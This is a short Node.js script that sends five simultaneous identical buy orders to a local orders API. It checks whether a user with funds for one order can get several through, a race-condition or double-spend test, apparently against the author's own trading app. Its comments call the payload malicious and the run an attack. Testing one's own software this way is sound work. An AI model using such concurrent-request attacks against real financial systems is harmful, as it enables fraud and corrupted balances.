const axios = require('axios');

// CONFIGURATION
const API_URL = 'http://localhost:3001/api/orders';
const USER_ID = 1;
const PRICE = 100;
const QUANTITY = 10; // Cost = $1000
const TOTAL_REQUESTS = 5;

// The malicious payload
const orderPayload = {
    user_id: USER_ID,
    stock_symbol: "GOOGL",
    order_type: "BUY",
    price: PRICE,
    quantity: QUANTITY
};

async function sendAttack() {
    console.log(` STARTING ATTACK...`);
    console.log(`User has funds for ONE order, but we are sending ${TOTAL_REQUESTS} at once.`);

    const requests = [];

    // Create 5 identical requests
    for (let i = 0; i < TOTAL_REQUESTS; i++) {
        requests.push(
            axios.post(API_URL, orderPayload)
                .then(res => console.log(`✅ Request ${i+1} Success: Order ID ${res.data.orderId}`))
                .catch(err => console.log(`❌ Request ${i+1} Failed: ${err.response?.data?.error || err.message}`))
        );
    }

    // FIRE THEM ALL AT THE EXACT SAME TIME
    await Promise.all(requests);

    console.log(` Attack Finished. Check your Database Balance for User ${USER_ID}.`);
}

sendAttack();